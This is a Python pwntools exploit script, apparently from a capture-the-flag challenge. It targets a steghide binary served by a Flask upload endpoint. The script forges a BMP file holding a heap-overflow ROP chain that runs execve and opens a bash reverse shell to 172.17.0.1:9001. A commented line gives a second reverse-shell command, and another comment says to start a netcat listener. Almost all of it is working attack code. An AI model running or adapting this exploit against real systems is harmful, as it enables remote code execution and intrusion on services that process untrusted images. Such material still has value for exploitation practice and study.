#!/usr/bin/env python3

import requests 
from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('steghide', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x41EDBA     
        # b*0x41EE63 
        # b*0x41775f
        # b*0x41B402 
        b*0x41B363 
        c
        ''')
        # sleep(1)

# ==========================================
# Phase 1: Forging the Malicious BMP Header
# ==========================================
# 1. BMP File Header (14 bytes)
bmp = b"BM"              # Signature (Tells the program "I am a BMP!")
bmp += p32(0x10000)      # Total File size (Dummy value, the program rarely checks this)
bmp += p32(0)            # Reserved bytes (Must be zero)
bmp += p32(54)           # Offset to the pixel data (14 + 40 = 54)

# 2. DIB Header / BITMAPINFOHEADER (40 bytes)
bmp += p32(40)           # Size of this DIB header
bmp += p32(100)          # Width (Linelength). We'll keep this small so the math is easy. 
bmp += p32(10)           # Height

bmp += p16(1)            # Color planes (Must be 1)
bmp += p16(24)           # Bits per pixel (24-bit = No color palette needed!)
bmp += p32(0)            # Compression (0 = None)
bmp += p32(0)            # Image size (Dummy)
bmp += p32(0)            # X pixels per meter
bmp += p32(0)            # Y pixels per meter
bmp += p32(0)            # Colors in color table
bmp += p32(0)            # Important color count

# ==========================================
# Phase 2: The Heap Smash Payload
# ==========================================

mov_rax = 0x000000000040db3e # mov rax, rdx ; pop rbp ; ret
pop_rdi = 0x0000000000450e8b
pop_rdx = 0x000000000042cd0c
pop_rsi = 0x0000000000417f3e
syscall = 0x00000000004066b3


mov_rsi_rax = 0x000000000041c58e #  mov rsi, rax ; mov rdi, r13 ; call r14
pop_13_14_rbp = 0x000000000041bd45 #  pop r13 ; pop r14 ; pop rbp ; rety

bss = 0x48a080
memcpy = 0x41B363
fake_rbp = 0xc28 + bss
fake_argv = bss + 0x48
# sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
payload = flat(
    b"/bin/bash".ljust(16,b'\0'),
    b"-c".ljust(8,b'\0'),
    b"bash -i >& /dev/tcp/172.17.0.1/9001 0>&1".ljust(0x30,b'\0'),
    # b"ls > /dev/tcp/172.17.0.1/9001".ljust(0x30,b'\0'),
    
    # array of string pointers
    bss,
    bss+0x10,
    bss+0x18,
    0,
)

payload = payload.ljust(0xbf8, b'a')

payload += flat(
    pop_rdx,
    0xd00,
    pop_13_14_rbp,
    bss,
    memcpy,
    fake_rbp,
    mov_rsi_rax,
    pop_rdi,
    bss,
    pop_rsi,
    fake_argv,
    pop_rdx,
    0x3b,
    mov_rax,
    0,
    pop_rdx,
    0,
    syscall

)
# payload = b'a'
bmp += payload

# Write our forged weapon to disk
with open("evil.bmp", "wb") as f:
    f.write(bmp)

log.info("Forged evil.bmp successfully!")



# ==========================================
# Phase 3: Execution
# ==========================================
# Tell steghide to analyze our malicious file


#########################################
### create local host:  nc -lvnp 9001 ###
#########################################

if args.REMOTE:
    # 1. The URL of the Flask app
    # (Change 127.0.0.1 to the Docker container's IP if it's hosted elsewhere)
    url = 'http://127.0.0.1:8000/stegsolver'

    # 2. Package the file
    # The key 'file' must match what Flask looks for: request.files['file']
    # It reads 'evil.bmp' from your hard drive in raw binary ('rb') mode.
    file = {
        'file': ('evil.bmp', open('evil.bmp', 'rb'))
    }

    # 3. Package the form data
    # The key 'passphrase' matches: request.form['passphrase']
    passphrase = {
        'passphrase': 'ehehe'
    }

    log.info("Sending evil.bmp via HTTP POST request...")

    # 4. Pull the trigger
    try:
        # This acts exactly like clicking "Submit" on the website
        response = requests.post(url, files=file, data= passphrase)
        
        log.info("Server responded with:")
        # Print out whatever the web server sends back!
        print(response.text)
        
    except Exception as e:
        log.error(f"Connection failed: {e}")
else:
    # p = process(argv)
    argv = [exe.path, 
        b'extract', 
        b'-sf', b'evil.bmp' ,
        b'-p', b'ls', 
        b'-xf', b'dummy.txt']

    p = gdb.debug(argv, gdbscript='''
        # b*0x41EDBA     
        # b*0x41EE63 
        # b*0x41775f
        # b*0x41B402
        # b*0x04176EF  
        b*0x41B363
        
        # debug again
        # b*0x4176EB
        # b*0x4176F6 
        # b*_Unwind_RaiseException+387
        # b*_Unwind_RaiseException
        c
    ''')
    p.interactive()
    
